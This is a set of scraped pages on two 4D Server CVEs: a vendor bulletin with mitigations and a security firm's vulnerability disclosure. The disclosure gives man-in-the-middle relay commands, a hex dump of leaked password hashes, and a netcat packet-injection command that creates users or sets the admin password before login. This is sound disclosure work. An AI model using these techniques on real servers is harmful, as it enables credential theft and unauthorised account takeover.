=== Content from packetstormsecurity.com_dd222bf4_20250114_192010.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from blog.4d.com_d7f1bf57_20250114_192008.html ===

## [4D Blog](https://blog.4d.com/ "4D Blog")

# Security bulletin: Two CVEs and how to stay secure

You may have come across two recent CVEs declared for 4D. Please find here below the actions you must take in order to stay secure.

# [CVE-2023-30222](https://www.cve.org/CVERecord?id=CVE-2023-30222): Information disclosure vulnerability

This CVE refers to an information disclosure vulnerability in all 4D versions allowing attackers to retrieve password hashes for all users via eavesdropping.

The detected vulnerability states that, when communication between client and server is encrypted (project settings), the communication can still be read in clear form by anyone having the server private key. This sounds obvious: your server private key should remain secret.

Even if 4D ships default certificate and key to ease development and testing, our [documentation always strongly recommends](https://developer.4d.com/docs/Admin/tls/#installing-keypem-and-certpem-files) to replace them with your own.

To ease your task at replacing such server private key, 4D v20 R4 will re-generate it automatically at each server start. This way each 4D server instance has its own – different – private key.

# [CVE-2023-30223](https://www.cve.org/CVERecord?id=CVE-2023-30223): broken authentication vulnerability

This CVE describes a broken authentication vulnerability allowing attackers to send crafted TCP packets containing requests to perform arbitrary actions.

Such injections are possible only if the attacker has his hands on the server private key. So once again, to stay safe, be sure to replace default server keys by your own.

To further improve security of those applications, 4D provides a bugfix to only accept strictly necessary requests before authenticating. This improvement is especially relevant for 4D applications using the built-in password system. It is available starting from the following versions:

* 4D v19.7 LTS, build 288986
* 4D v20.2 LTS, build 100956
* 4D v20 R2 HF1, build 100440
* 4D v20 R3 and further

4D applications not using the built-in password system are not directly impacted by this vulnerability as their security relies on their own implementation or external directories (such as LDAP, Active Directory or Microsoft 365).

#

# Conclusion

We strongly recommend to use your own server private key and keep it secret, whatever your 4D version is.

We also recommend you to upgrade 4D to its latest version and observe recommendations provided in our [4D security guide.](https://blog.4d.com/4d-security-guide/)

Subscribe to 4D Newsletter
© 2025 [4D SAS](https://www.4d.com)  - All rights reserved

### Subscribe to 4D Newsletter

\* Your privacy is very important to us. Please click here to view our [Policy](https://us.4d.com/data-policy)

### Contact us

Got a question, suggestion or just want to get in touch with the 4D bloggers? Drop us a line!

\* Your privacy is very important to us. Please click here to view our [Policy](https://us.4d.com/data-policy)



=== Content from www.infigo.is_6bb54a30_20250114_192010.html ===

[![](/images/infigo-logo.svg)](/en/)

* Managed Services
  + [Managed SOC (Security Operation Center)](/en/managed-services/managed-soc-security-operation-centers/)
  + [Managed Endpoint Protection](/en/managed-services/managed-endpoint-protection/)
  + [Cyber Incident Readiness and Response](/en/managed-services/cyber-incident-readiness-and-response/)
* Cybersecurity
  + [Red Team & Offensive Operations](/en/cybersecurity/red-team-offensive-operations/)
  + [Digital Forensics & Incident Response](/en/cybersecurity/digital-forensics-incident-response/)
* Solutions Delivery
  + [Our Partners](/en/solutions-delivery/our-partners/)
  + [Implementation](/en/solutions-delivery/implementation/)
  + [Splunk Professional Services](/en/solutions-delivery/splunk-professional-services/)
* Consulting
  + [Cybersecurity Consulting](/en/consulting/cybersecurity-consulting/)
  + [Governance, Risk, and Compliance (GRC)](/en/consulting/governance-risk-and-compliance-grc/)
* Software Solutions
  + [Compli](/en/software-solutions/compli/)
  + [FRAML (FRaud and Anti-Money Laundering)](/en/software-solutions/framl-fraud-and-anti-money-launderings/)
  + [Print Monitoring](/en/software-solutions/print-monitoring/)
  + [SIEM (Security Information and Event Management)](/en/software-solutions/siem-security-information-and-event-management/)
* Industries
  + [Business Intelligence & Analytics](/en/industries/business-intelligence-analytics/)
  + [By Sector](/en/industries/by-sector/)
* About Us
  + [About Us](/en/about-us/about-us/)
  + [Insights](/en/insights/)
  + [EU Projects](/en/about-us/eu-projects/)
* [Careers](/en/careers/)
* [Contact](/en/contact/)
* [Hrvatski](/hr/ "Hrvatski")
* [English](/en/ "English")

* [Careers](/en/careers/)
* [Contact](/en/contact/)
* English
  + [Hrvatski](/hr/ "Hrvatski")
  + [English](/en/ "English")

# Information disclosure and broken authentication in 4D SAS 4D Server

---

![](/upload/tbl_novosti/securitynotebook42_20230607753.jpg)Today we have a twofer, two vulnerabilities in one package! Vulnerabilities can be found in 4D Server, and both were found by our intrepid hacker, **Karlo Dautović**.

**UPDATE**: Official CVEs (Common Vulnerabilities and Exposures) have been assigned; information disclosure is hiding under [CVE-2023-30222](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30222), and broken authentication under [CVE-2023-30223](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30223).

If you want to reproduce them, Karlo has prepared all the necessary files in one [package](/upload/assets/4d_server/mitm_relay.zip "mitm_relay").

**The first one, an information disclosure**, can be used to retrieve password hashes for all users via eavesdropping, and **the second one, a broken authentication**, can be used to send crafted TCP packets containing requests to perform arbitrary actions.

But how do they work? Well, Karlo explains it like this:

You can use 4D trial version software to exploit these vulnerabilities, alongside Burp Suite and three modified mitm\_relay scripts, mitm\_relay1.py, mitm\_relay2.py, and mitm\_relay3.py (for more on mitm\_relay check out [jrmdev](https://github.com/jrmdev/mitm_relay) GitHub page). The scripts relay the app's network traffic through Burp Suite listening with a proxy server on localhost:8080.
The scripts were modified to not listen to the same port and to add a way to insert packets into the TCP stream between the app and the server (script - mitm\_relay3.py). For each connection made to the port specified in the script, a new UDP port was opened (from 5555 ascending) and then every UDP package sent to the port was injected into the TCP connection and sent to the server.

The attack was conduced using three different VMs; one Kali Linux (for Burp Suite and modified mitm\_relay scripts) and two Windows machines (for 4D client and 4D server).
The app uses three ports, 19812, 19813, and 19814; port 19812 doesn't use SSL (even when enabled), 19813 does (plus client certificates), as well as 19814. But the client certificates are the same for all installations of 4D (included in the trial version) – as verified by the audit.
All three client certificates locations are as follows (they are all identical):
`4D v18 R5/`
`├── 4D`
`│ └── Resources`
`│ ├── cert.pem`
`│ └── key.pem`
`├── 4D Server`
`│ └── Resources`
`│ ├── cert.pem`
`│ └── key.pem`
`└── 4D Volume Desktop`
 `└── Resources`
 `├── cert.pem`
 `└── key.pem`

By using a script (gen\_certs.sh), Karlo created dummy SSL certificates and then used the mitm\_relay to present itself as an SSL server to the app.
By starting Burp Suite, and three scripts, 4D client app is routed to the Kali Linux machine, and then to the 4D server. When the client connects, all traffic between the server and the client is visible in Burp Suite and the console output of mitm\_relay.
The commands looked like this:
`./mitm_relay1.py -r 19812:192.168.1.16:19812 -p http://127.0.0.1:8080`
`./mitm_relay3.py -r 19813:192.168.1.16:19813 -p http://127.0.0.1:8080 -c server.pem -k private.key -cc cert.pem -ck key.pem`
`./mitm_relay2.py -r 19814:192.168.1.16:19814 -p http://127.0.0.1:8080 -c server.pem -k private.key`
(192.168.1.16 was the IP address of the 4D server during the penetration test)

At some point, the server sends all the users and their respective password hashes to the application, indicating that the login is handled on the client side (which is confirmed later, with the second vulnerability). This packet, containing the password hashes, is visible both within Burp Suite and within mitm\_relay.

Burp Suite:
![](/upload/assets/4d_server/01%20burp%20suite.png)

mitm\_relay (with TLS turned on – mitm\_relay is presenting dummy SSL certificates to the client, which accepts it without question):
`S >> C [ 192.168.1.16:19813 >> 192.168.1.14:1169 ] [ Thu 22 Apr 04:45:03 ] [ 1096 ]`
`00000001: 00 00 42 04 00 00 E1 FD FF FF 7B 00 22 00 72 00 |..B.......{.".r.|`
`00000001: 65 00 62 00 6F 00 6F 00 74 00 22 00 3A 00 74 00 |e.b.o.o.t.".:.t.|`
`00000001: 72 00 75 00 65 00 2C 00 22 00 75 00 73 00 65 00 |r.u.e.,.".u.s.e.|`
`00000001: 72 00 73 00 22 00 3A 00 7B 00 22 00 64 00 65 00 |r.s.".:.{.".d.e.|`
`00000001: 73 00 69 00 67 00 6E 00 65 00 72 00 22 00 3A 00 |s.i.g.n.e.r.".:.|`
`00000001: 7B 00 22 00 70 00 61 00 73 00 73 00 77 00 6F 00 |{.".p.a.s.s.w.o.|`
`00000001: 72 00 64 00 22 00 3A 00 22 00 69 00 71 00 66 00 |r.d.".:.".i.q.f.|`
`00000001: 6F 00 45 00 4B 00 72 00 33 00 63 00 53 00 77 00 |o.E.K.r.3.c.S.w.|`
`00000001: 54 00 66 00 73 00 6E 00 2B 00 34 00 71 00 48 00 |T.f.s.n.+.4.q.H.|`
`00000001: 62 00 30 00 51 00 3D 00 3D 00 22 00 2C 00 22 00 |b.0.Q.=.=.".,.".|`
`00000001: 61 00 6C 00 69 00 61 00 73 00 22 00 3A 00 22 00 |a.l.i.a.s.".:.".|`
`00000001: 44 00 65 00 73 00 69 00 67 00 6E 00 65 00 72 00 |D.e.s.i.g.n.e.r.|`
`00000001: 22 00 7D 00 2C 00 22 00 61 00 64 00 6D 00 69 00 |".}.,.".a.d.m.i.|`
`00000001: 6E 00 69 00 73 00 74 00 72 00 61 00 74 00 6F 00 |n.i.s.t.r.a.t.o.|`
`00000001: 72 00 22 00 3A 00 7B 00 22 00 61 00 6C 00 69 00 |r.".:.{.".a.l.i.|`
`00000001: 61 00 73 00 22 00 3A 00 22 00 41 00 64 00 6D 00 |a.s.".:.".A.d.m.|`
`00000001: 69 00 6E 00 69 00 73 00 74 00 72 00 61 00 74 00 |i.n.i.s.t.r.a.t.|`
`00000001: 6F 00 72 00 22 00 7D 00 2C 00 22 00 4E 00 65 00 |o.r.".}.,.".N.e.|`
`00000001: 77 00 20 00 75 00 73 00 65 00 72 00 22 00 3A 00 |w. .u.s.e.r.".:.|`
`00000001: 7B 00 22 00 70 00 61 00 73 00 73 00 77 00 6F 00 |{.".p.a.s.s.w.o.|`
`00000001: 72 00 64 00 22 00 3A 00 22 00 37 00 79 00 30 00 |r.d.".:.".7.y.0.|`
`00000001: 6C 00 63 00 76 00 43 00 37 00 51 00 39 00 55 00 |l.c.v.C.7.Q.9.U.|`
`00000001: 48 00 42 00 68 00 37 00 4A 00 64 00 76 00 41 00 |H.B.h.7.J.d.v.A.|`
`00000001: 39 00 67 00 77 00 3D 00 3D 00 22 00 7D 00 2C 00 |9.g.w.=.=.".}.,.|`
`00000001: 22 00 54 00 65 00 77 00 20 00 75 00 73 00 65 00 |".T.e.w. .u.s.e.|`
`00000001: 72 00 22 00 3A 00 7B 00 22 00 70 00 61 00 73 00 |r.".:.{.".p.a.s.|`
`00000001: 73 00 77 00 6F 00 72 00 64 00 22 00 3A 00 22 00 |s.w.o.r.d.".:.".|`
`00000001: 69 00 71 00 66 00 6F 00 45 00 4B 00 72 00 33 00 |i.q.f.o.E.K.r.3.|`
`00000001: 63 00 53 00 77 00 54 00 66 00 73 00 6E 00 2B 00 |c.S.w.T.f.s.n.+.|`
`00000001: 34 00 71 00 48 00 62 00 30 00 51 00 3D 00 3D 00 |4.q.H.b.0.Q.=.=.|`
`00000001: 22 00 7D 00 7D 00 2C 00 22 00 73 00 71 00 6C 00 |".}.}.,.".s.q.l.|`
`00000001: 53 00 63 00 68 00 65 00 6D 00 61 00 47 00 72 00 |S.c.h.e.m.a.G.r.|`
`00000001: 61 00 6E 00 74 00 65 00 72 00 73 00 22 00 3A 00 |a.n.t.e.r.s.".:.|`
`00000001: 7B 00 22 00 44 00 45 00 46 00 41 00 55 00 4C 00 |{.".D.E.F.A.U.L.|`
`00000001: 54 00 5F 00 53 00 43 00 48 00 45 00 4D 00 41 00 |T._.S.C.H.E.M.A.|`
`00000001: 22 00 3A 00 7B 00 22 00 72 00 65 00 61 00 64 00 |".:.{.".r.e.a.d.|`
`00000001: 4F 00 6E 00 6C 00 79 00 41 00 63 00 63 00 65 00 |O.n.l.y.A.c.c.e.|`
`00000001: 73 00 73 00 47 00 72 00 6F 00 75 00 70 00 22 00 |s.s.G.r.o.u.p.".|`
`00000001: 3A 00 22 00 2A 00 22 00 2C 00 22 00 72 00 65 00 |:.".*.".,.".r.e.|`
`00000001: 61 00 64 00 57 00 72 00 69 00 74 00 65 00 41 00 |a.d.W.r.i.t.e.A.|`
`00000001: 63 00 63 00 65 00 73 00 73 00 47 00 72 00 6F 00 |c.c.e.s.s.G.r.o.|`
`00000001: 75 00 70 00 22 00 3A 00 22 00 2A 00 22 00 2C 00 |u.p.".:.".*.".,.|`
`00000001: 22 00 61 00 6C 00 6C 00 41 00 63 00 63 00 65 00 |".a.l.l.A.c.c.e.|`
`00000001: 73 00 73 00 47 00 72 00 6F 00 75 00 70 00 22 00 |s.s.G.r.o.u.p.".|`
`00000001: 3A 00 22 00 22 00 7D 00 7D 00 2C 00 22 00 73 00 |:.".".}.}.,.".s.|`
`00000001: 65 00 74 00 74 00 69 00 6E 00 67 00 73 00 22 00 |e.t.t.i.n.g.s.".|`
`00000001: 3A 00 7B 00 22 00 6C 00 6F 00 63 00 61 00 6C 00 |:.{.".l.o.c.a.l.|`
`00000001: 47 00 65 00 6E 00 65 00 72 00 69 00 63 00 57 00 |G.e.n.e.r.i.c.W.|`
`00000001: 65 00 62 00 55 00 73 00 65 00 72 00 22 00 3A 00 |e.b.U.s.e.r.".:.|`
`00000001: 22 00 44 00 65 00 73 00 69 00 67 00 6E 00 65 00 |".D.e.s.i.g.n.e.|`
`00000001: 72 00 22 00 2C 00 22 00 64 00 65 00 73 00 69 00 |r.".,.".d.e.s.i.|`
`00000001: 67 00 6E 00 41 00 63 00 63 00 65 00 73 00 73 00 |g.n.A.c.c.e.s.s.|`
`00000001: 47 00 72 00 6F 00 75 00 70 00 22 00 3A 00 22 00 |G.r.o.u.p.".:.".|`
`00000001: 2A 00 22 00 2C 00 22 00 6C 00 6F 00 63 00 61 00 |*.".,.".l.o.c.a.|`
`00000001: 6C 00 4D 00 6F 00 62 00 69 00 6C 00 65 00 41 00 |l.M.o.b.i.l.e.A.|`
`00000001: 63 00 63 00 65 00 73 00 73 00 47 00 72 00 6F 00 |c.c.e.s.s.G.r.o.|`
`00000001: 75 00 70 00 52 00 57 00 22 00 3A 00 22 00 2A 00 |u.p.R.W.".:.".*.|`
`00000001: 22 00 2C 00 22 00 72 00 65 00 6D 00 6F 00 74 00 |".,.".r.e.m.o.t.|`
`00000001: 65 00 4D 00 6F 00 62 00 69 00 6C 00 65 00 41 00 |e.M.o.b.i.l.e.A.|`
`00000001: 63 00 63 00 65 00 73 00 73 00 47 00 72 00 6F 00 |c.c.e.s.s.G.r.o.|`
`00000001: 75 00 70 00 52 00 57 00 22 00 3A 00 22 00 2A 00 |u.p.R.W.".:.".*.|`
`00000001: 22 00 2C 00 22 00 72 00 65 00 6D 00 6F 00 74 00 |".,.".r.e.m.o.t.|`
`00000001: 65 00 47 00 65 00 6E 00 65 00 72 00 69 00 63 00 |e.G.e.n.e.r.i.c.|`
`00000001: 57 00 65 00 62 00 55 00 73 00 65 00 72 00 22 00 |W.e.b.U.s.e.r.".|`
`00000001: 3A 00 22 00 44 00 65 00 73 00 69 00 67 00 6E 00 |:.".D.e.s.i.g.n.|`
`00000001: 65 00 72 00 22 00 2C 00 22 00 72 00 65 00 6D 00 |e.r.".,.".r.e.m.|`
`00000001: 6F 00 74 00 65 00 44 00 65 00 66 00 61 00 75 00 |o.t.e.D.e.f.a.u.|`
`00000001: 6C 00 74 00 55 00 73 00 65 00 72 00 22 00 3A 00 |l.t.U.s.e.r.".:.|`
`00000001: 22 00 22 00 7D 00 7D 00 |".".}.}.|`

**And now for the second vulnerability!**

This one involves injecting packets into the TCP connection between the server and the client before login is done. This, along with the server sending all password hashes to the client, indicates that the application uses client-side authentication.

We're injecting packets with the beforementioned script (that one that opens UDP ports) – to successfully inject a package it needs to be sent to the localhost port that was opened last.
Several packets were saved which can be used with 4D v18 R5 servers.
In order to inject them, they can be sent using the following command to the local UDP port:
`cat create-user | nc -u 127.0.0.1 5556`
5556 needs to be changed to match the last opened UDP port. This can be seen using the following command:
`$ ss -ulnp`
`State Recv-Q Send-Q Local Address:Port Peer Address:Port Process`
`UNCONN 0 0 0.0.0.0:5561 0.0.0.0:* users:(("python3",pid=10668,fd=16))`

The most notable examples of the vulnerability would be changing the user's password, resetting it, or creating a new user.

Demonstrating this is easy. This is the state of the Administrator user before doing anything (notice the lack of a password):
![](/upload/assets/4d_server/02%20admin%20default.png)

Now, after sending the set-admin-password packet, closing the application, and restarting it, it's possible to see that the password is now set:
![](/upload/assets/4d_server/03%20admin%20pass%20set.png)

And to create a new user, the create-user packet was sent, and the application restarted. When the application connects to the server, the new user was successfully added:
![](/upload/assets/4d_server/04%20set%20user.png)

It's worth noting that the application needs to be restarted every time packets are injected, otherwise, the changes are not visible in the client application.
Additionally, this was **originally tested on 4D v18 R5**, but was later **confirmed to be working on both 4D v17, and 4D v19 R7**, however, the packets are different and need to be captured again for each version.

The packets were captured using a trial version of 4D, locally, in an attacker-controlled environment. The captured packets were then tested using the attacker's copy of 4D, mitm\_relay, and Burp Suite, on a production server running 4D, and it was confirmed that it works. So, in order to exploit this, an attacker can replicate everything they want to do locally, capture the traffic, and then connect to a server that they want to exploit and inject the packets into the connection.

All of this works before the user even logs into the application, as mentioned.

[< Back to insights](/en/insights/)

![](/images/infigo-logo-white.svg)

Infigo IS is an information security and data analytics company with offices in five countries and operations on three continents. It has five teams covering cybersecurity, development, implementation, consulting, and managed services – with all that it is capable of handling any project for a number of industries.

#### SUPPORT

* [Support Portal](https://support.infigo.hr/)
* [Privacy Policy](/en/privacy-policy/)
* [Cookie Policy](/en/cookie-policy/)
* [License Agreement](/en/license-agreement/)

#### Infigo IS d.o.o.

 Karlovačka cesta 24A,
10020 Zagreb
 info@infigo.hr
 +385 1 4662 700
  www.infigo.is

Copyright – Infigo IS 2025. All Right Reserved


